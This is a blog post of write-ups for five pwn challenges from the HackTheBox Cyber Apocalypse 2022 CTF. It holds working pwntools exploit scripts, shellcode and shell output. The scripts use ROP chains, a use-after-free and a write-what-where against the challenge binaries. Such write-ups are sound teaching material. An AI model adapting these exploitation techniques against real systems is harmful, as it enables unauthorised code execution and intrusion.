---
title: "HackTheBox CTF Cyber Apocalypse 2022: Intergalactic Chase (PWN)"
date: 2022-05-20T10:01:40+02:00
draft: false
toc: true
images:
tags: 
  - ctf
---

[Hack The Box](https://www.hackthebox.com) was hosting a CTF event and we played together with some friends.

Here are some writeups for some of the PWN challenges i solved.

Any code you can find here is very low ctf quality :)


# 0. TOC


1. [Space pirate: Retribution](#1-space-pirate-retribution)

2. [Vault Breaker](#2-vault-breaker)

3. [Fleet Management](#3-fleet-management)

4. [Hellhound](#4-hellhound)

5. [Trick Or Deal](#5-trick-or-deal)




# 1. Space pirate: Retribution

Original files are [here](pwn_sp_retribution.zip).

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

The binary is PIE we need to leak its base, it also has full RELRO so overwritting a GOT entry is not an option.

The ```missile_launcher``` function is vulnerable:
- it leaks the binary base via a stack variable
- there's a buffer overflow

The goal here is:
- leak binary base
- exploit the overflow to leak a libc address via the GOT
- system("/bin/sh")

```python
from pwn import *
import re

local_path = "sp_retribution"

pty = process.PTY
elf = context.binary = ELF(local_path)

libc = ELF('glibc/libc-2.23.so')

def init(rem=False):
    if rem:
        io = remote("138.68.188.223", 30195)
    else:
        io = process(elf.path, stdin=pty, stdout=pty)


    return io




def find_rip_offset(io):
    io.clean()
    io.sendline(cyclic(0x1000))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    info("cyclic pattern = %s", pattern.decode())
    rip_offset = cyclic_find(pattern)
    info("rip offset is = %d", rip_offset)
    return rip_offset

#io = init()
#offset = find_rip_offset(io)
#io.close()
offset = 88

# leak
io = init(True)

io.recvuntil(b">> ")
io.sendline(b'2')
io.recvuntil(b'y = ')
io.sendline(b'')
data = io.recvuntil(b'(y/n): ')

# leak base elf addr
#base = u32(re.findall(b"y = \n\r(.*?)\n", data)[0]) << 16
base = data.split(b'\n')[-2]
base = u32(base[1:]) << 16


print("leaked base: %s"%hex(base))



pop_rdi_ret = 0x0000000000000d33

chain = b'A'*offset
chain += p64(base + pop_rdi_ret)                # load got.read into rdi
chain += p64(base + elf.got.read)
chain += p64(base + elf.plt.puts)               # leak it
chain += p64(base + elf.sym.missile_launcher)   # go back to vuln function

# send stage1
io.sendline(chain)
#context.log_level = 'debug'
# read leaked address
io.recvuntil(b"eset!\x1b[1;34m\n")


libc_read = u64(io.recv(6) + b'\x00\x00')
print("leaked read add: %s"%hex(libc_read))

# compute some offset, easy game we have a copy of the libc
system = libc_read - 0xb1fb0
bin_sh = libc_read + 0x95b07

# play again
io.recvuntil(b'y = ')
io.sendline(b'')
io.recvuntil(b'(y/n): ')

# system(/bin/sh)
chain = b'A'*offset
chain += p64(base + pop_rdi_ret)
chain += p64(bin_sh)
chain += p64(system)
print("shell...")
io.sendline(chain)
io.interactive()

```

```
% python pwn_retribution.py
[+] Opening connection to 138.68.188.223 on port 30195: Done
leaked base: 0x55d80eab0000
leaked read add: 0x7f893c52b350
shell...
[*] Switching to interactive mode

[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!
$ id
uid=100(ctf) gid=101(ctf)
$ cat flag.txt
HTB{d0_n0t_3v3R_pr355_th3_butt0n}
$
[*] Interrupted
[*] Closed connection to 138.68.188.223 port 30195
```


# 2. Vault Breaker

Original files are [here](pwn_vault_breaker.zip).

The binary reads a 32 bytes random key:
```C
    __stream = fopen("/dev/urandom","rb");
    __fd = fileno(__stream);
    read(__fd,random_key,0x20);
```

then output the flag xored with the random key

```C
    fwrite("\nMaster password for Vault: ",1,0x1c,stdout);
    i = 0;
    while( true ) {
        i_ = (ulong)i;
        len = strlen(flagstr);
        if (len <= i_)
            break;
        putchar((int)(char)(random_key[i] ^ flagstr[i]));
        i = i + 1;
    }
```

we have the option to generate a new random key of given size before dumping the xored flag:

```C
    __stream = fopen("/dev/urandom","rb");

    while (0x1f < size) {
        printf("\n[*] Length of new password (0-%d): ",0x1f);
        size = read_num();
    }
    
    memset(buff,0,0x20);
    fd = fileno(__stream);
    read(fd,buff,size);
    
    for (; n < size; n = n + 1) {
        while (buff[n] == '\0') {
            fd = fileno(__stream);
            read(fd,buff + n,1);
        }
    }
    /* includes trailing NULL byte */
    strcpy(random_key,buff);
```

If we request a new key of size 8, it will replace the first 8 bytes of the random_key by new random bytes.

The bug is that it's using strcpy, which will also copy the trailing NULL byte.

```
before strcpy, original key:

pwndbg> x/32bx 0x555555606060
0x555555606060 <random_key>:	0x8a	0x3a	0x46	0x49	0x61	0x31	0xe8	0xb3
0x555555606068 <random_key+8>:	0x5a	0x11	0xf9	0xb5	0x93	0x93	0xb8	0xd5
0x555555606070 <random_key+16>:	0xff	0xc3	0xaa	0xc2	0xef	0xef	0x22	0xdd
0x555555606078 <random_key+24>:	0x04	0x2c	0x87	0xe8	0x3e	0xc0	0xab	0x12


after strcpy:
pwndbg> x/32bx 0x555555606060
0x555555606060 <random_key>:	0x34	0x7e	0x37	0xf6	0xab	0x41	0x4c	0x36
0x555555606068 <random_key+8>:	0x00	0x11	0xf9	0xb5	0x93	0x93	0xb8	0xd5
0x555555606070 <random_key+16>:	0xff	0xc3	0xaa	0xc2	0xef	0xef	0x22	0xdd
0x555555606078 <random_key+24>:	0x04	0x2c	0x87	0xe8	0x3e	0xc0	0xab	0x12

8 new first bytes, and a NULL byte at random_key+8
```

- new key of size 0: random_key[0] = 0
- new key of size 1: random_key[1] = 0
- new key of size 2: random_key[2] = 0

etc...

since the flag is xor'd with the key and flag ^ 0 == flag, we can leak the flag byte by byte...

```python
from pwn import *
import time

context.log_level = 'error'

password = ''
# leak key byte by byte
for x in range(32):
    io = remote("165.227.224.55", 32647)
    io.recvuntil(b"> ")
    # generate new key
    io.sendline(b"1")
    io.recvuntil(b"Length of new password (0-31): ")
    # send 
    io.sendline(str(x))

    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"Master password for Vault: ")

    password += chr(io.recv(1024)[x])
    
    print(password)
    time.sleep(0.3) # connection throttle

```

```
% python dmp.py
H
HT
HTB
HTB{
HTB{l
HTB{l4
HTB{l4_
HTB{l4_c
HTB{l4_c4
HTB{l4_c45
HTB{l4_c454
HTB{l4_c454_
HTB{l4_c454_d
HTB{l4_c454_d3
HTB{l4_c454_d3_
HTB{l4_c454_d3_b
HTB{l4_c454_d3_b0
HTB{l4_c454_d3_b0n
HTB{l4_c454_d3_b0nN
HTB{l4_c454_d3_b0nNi
HTB{l4_c454_d3_b0nNi3
HTB{l4_c454_d3_b0nNi3}
HTB{l4_c454_d3_b0nNi3}
HTB{l4_c454_d3_b0nNi3}
```



# 3. Fleet Management

Original files are [here](pwn_fleet_management.zip).

Use the hidden menu option ```9``` to land in the ```beta_feature``` function.
from there it's a classic shellcode writting challenge

```C
void beta_feature(void)

{
    code *__buf;
    
    __buf = (code *)malloc(0x3c);
    mprotect((void *)((ulong)__buf & 0xfffffffffffff000),0x3c,7);
    read(0,__buf,0x3c);
    skid_check();
    (*__buf)();
    return;
}
```

except that the ```skid_check()``` use ```seccomp``` to restrict the available syscalls:
```C
void skid_check(void)

{
    undefined8 uVar1;
    
    uVar1 = seccomp_init(0);
    seccomp_rule_add(uVar1,0x7fff0000,60,0);    /* exit */
    seccomp_rule_add(uVar1,0x7fff0000,231,0);   /* exit_group */
    seccomp_rule_add(uVar1,0x7fff0000,257,0);   /* openat */
    seccomp_rule_add(uVar1,0x7fff0000,40,0);    /* sendfile */
    seccomp_rule_add(uVar1,0x7fff0000,15,0);    /*  rt_sigreturn */
    seccomp_load(uVar1);
    return;
}
```

also the shellcode needs to fits in 60 bytes.

I went with the obvious combo ```openat```+```sendfile```:
```nasm
; % nasm -felf64 -o getflag.o getflag.asm
; % ld -o getflag getflag.o    


        global _start

_start:
        xor rdx, rdx        ; flags
        mov rdi, 0xffffff9c ; AT_FDCWD
        lea rsi, [rel buf]  ; path
        mov rax, 257        ; openat
        syscall

        xor rdi, rdi        ; out fd // 0
        mov rsi, rax        ; out fd // from openat result
        xor rdx, rdx        ; offset // 0
        mov r10, 255        ; size
        mov rax, 40         ; sendfile
        syscall

buf:    db 'flag.txt', 0
```

and the final exploit:
```python
from pwn import *


shellcode = b'\x48\x31\xd2\xbf\x9c\xff\xff\xff\x48\x8d\x35\x1d\x00\x00\x00\xb8\x01\x01\x00\x00\x0f\x05\x48\x31\xff\x48\x89\xc6\x48\x31\xd2\x41\xba\xff\x00\x00\x00\xb8\x28\x00\x00\x00\x0f\x05\x66\x6c\x61\x67\x2e\x74\x78\x74\x00'

io = remote("157.245.47.33", 31234)
#io = process("./fleet_management")
io.recvuntil(b'What do you want to do? ')

io.sendline(b"9")
io.sendline(shellcode)
print(io.recv(1024))
```

```
% python xpl.py
[+] Opening connection to 157.245.47.33 on port 31234: Done
b'HTB{backd00r_as_a_f3atur3}\n'
[*] Closed connection to 157.245.47.33 port 31234
```



# 4. Hellhound
Original files are [here](pwn_hellhound.zip).

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./.glibc/'
```

It starts by allocating a 0x40 bytes buffer
```C
buffer[0] = malloc(0x40);
```

option 1 leaks the stack address of ```buffer```
```C
printf("\n[+] In the back of its head you see this serial number: [%ld]\n",buffer);
```


option 2 allows you to write 32 bytes in this buffer:
```C
read(0,buffer[0],0x20);
```

option 3 is our write-what-where
```
   0x400d86 <main+191>    mov    rax, qword ptr [rbp - 0x48]    ; rax = *(buffer[0]) // 0x603010 ◂— 'AAAABBBBCCCCDDDD\n'
   0x400d8a <main+195>    add    rax, 8                         ; RAX  0x603018 ◂— 'CCCCDDDD\n'
   0x400d8e <main+199>    mov    rax, qword ptr [rax]           ; RAX  0x4444444443434343 ('CCCCDDDD')
 ► 0x400d91 <main+202>    mov    qword ptr [rbp - 0x48], rax    ; buffer[0] = 0x4444444443434343

pwndbg> x/gx $rbp - 0x48
0x7fffffffe3a8:	0x4444444443434343
```

we controll the value of ```buffer[0]``` and this value is dereferencedu before writting our input to it... so we can write anywhere.

hidden option 69 ```free(buffer[0]); return```


The flag function is 
```C
void berserk_mode_off(void)

{
    long lVar1;
    long in_FS_OFFSET;

    lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    fflush(stdout);
    system("cat ./flag.txt");
    if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }
    return;
}
```


The binary has full RELRO so we cannot overwrite a GOT entry.

It's not PIE so we do not need leak anything

The plan is to overwrite the return address on the stack witht the address of ```berserk_mode_off```, then pass the free() without crashing and trigger the RET.

```python
from pwn import *
import re

elf = context.binary = ELF("hellhound")

def start(rem=False):
    if not rem:
        return process(elf.path)
    else:
        return remote("167.71.137.43", 30871)


def leak():
    io.sendline(b'1')
    data = io.recv(1024)
    return int(re.findall(b'this serial number: \[(.*?)\]', data)[0])


def modify(data):
    io.sendline(b'2')
    io.recvuntil(b' code: ')
    io.sendline(data)
    io.recvuntil(b'>> ')

def check():
    io.sendline(b'3')
    io.recvuntil(b'>> ')

def bye():
    io.sendline(b'69')
    print(io.recv(1024))
    print(io.recv(1024))


io = start(rem=True)
io.recvuntil(b">> ")


# save buffer[0] address
buffer = leak()
print("buffer: %s"%hex(buffer))


modify(b'imstupid' + p64(buffer + 0x50))
# buffer[0] = stack addr of saved rip (buffer[0] + 0x50)
check()

modify(p64(elf.sym.berserk_mode_off) + p64(buffer))
# saved_rip = berserk_mode_off()
# buffer[0] = buffer
check()

# buffer[0] = '\x00'*16
modify(p64(0x00) + p64(0x00))                       
# free(NULL)
bye()                                              
```

```
[+] Opening connection to 46.101.25.63 on port 32408: Done
buffer: 0x7ffc352ed008
b'\x1b[1;31m[*] The beast seems quiet.. for the moment..\n'
b'HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}\n'
[*] Closed connection to 46.101.25.63 port 32408
```


# 5. Trick Or Deal
Original files are [here](pwn_trick_or_deal.zip).

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

initialization:
```
storage = malloc(0x50)
*(code **)(storage + 0x48) = printStorage;
```

so storage+0x48 is a function pointer

option 1: calls the function pointer:
```S
      00101106 48 8b 05 33 0f 20 00     MOV                  RAX,qword ptr [storage]
      0010110d 48 8b 50 48              MOV                  RDX,qword ptr [RAX + 0x48]
      00101111 b8 00 00 00 00           MOV                  EAX,0x0
      00101116 ff d2                    CALL                 RDX
```

option 3:   allocate a chunk of user controlled size and write user controlled data to it
```C
        size = read_num();
        offer = malloc(size);
        read(0,offer,size);
```

option 4: free the storage pointer but not zero anything...
```free(storage)```


this function is our target:
```
void unlock_storage(void)

{
    fprintf(stdout,"\n%s[*] Bruteforcing Storage Access Code . . .%s\n",&DAT_001014a6,&DAT_0010149e);
    sleep(2);
    fprintf(stdout,"\n%s* Storage Door Opened *%s\n",&DAT_0010128b,&DAT_001014e1);
    system("sh");
    return;
}
```


the binary is PIE and we dot not know the base address, luckily because the cpu use little endian, we can only overwrite least 2 significat bytes of the function pointer without touch to the base.

```
% objdump -M intel -d trick_or_deal| grep 'printStorage>:'
0000000000000be6 <printStorage>:
% objdump -M intel -d trick_or_deal| grep 'unlock_storage>:'
0000000000000eff <unlock_storage>:

          00                        0x48  function_pointer
          +----------------------------+----+------------+
storage = |                            |e60b|base_addr   |
          +----------------------------+----+------------+
```

if we overwrite the 2 bytes at 0x48 and change them by ```ff0e``` - we should have a valid pointer to ```unlock_storage```


the plan is a simple use after free:
- offer = malloc(0x50)
- free(storage)
- offer = malloc(0x50)        // storage chunk address is reused, so offer = storage
- overwrite the 2 least significant bytes of the function pointer to make it point to ```unlock_storage```
- profit

not super stable exploit for some reason :p

```python
from pwn import *
import re
import sys
import time


local_path = "trick_or_deal"

pty = process.PTY
elf = context.binary = ELF(local_path)


def init(rem=False):
    if rem:
        io = remote("188.166.172.138", 31900)
    else:
        io = process(elf.path, stdin=pty, stdout=pty)


    io.recvuntil(b'do? ')
    return io

def make_offer(size, data):
    io.clean()
    io.sendline(b'3')       # make offer
    io.recvuntil(b'offer(y/n): ')
    io.sendline(b'y')
    io.recv(1024)
    #io.recvuntil(b'do ? ')
    io.sendline(bytes(str(size), 'ascii'))      # chunk size
    io.recv(1024)
    #io.recvuntil(b'me ? ')
    io.send(data)
    io.recv(1024)
    #io.recvuntil(b'do ? ')

def steal():
    io.clean()
    io.sendline(b'4')       # free
    io.recvuntil(b'do? ')


offset = elf.sym.unlock_storage & 0xffff
print(hex(offset))
print(p16(offset))



io = init(len(sys.argv) > 1)

print("allocating chunk")
make_offer(80, b'lodsjhfjdsjfjdsfl')

print("freeing storage")
steal()

print("allocating new chunk and overwritting printStorage")
make_offer(80, b'A'*72 + p16(offset))

io.clean()
io.sendline(b'1')
io.clean()
time.sleep(2)

print("profit...")
io.interactive()
```

```
[+] Opening connection to 188.166.172.138 on port 31900: Done
allocating chunk
freeing storage
allocating new chunk and overwritting printStorage
profit...
[*] Switching to interactive mode

* Storage Door Opened *
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}
```


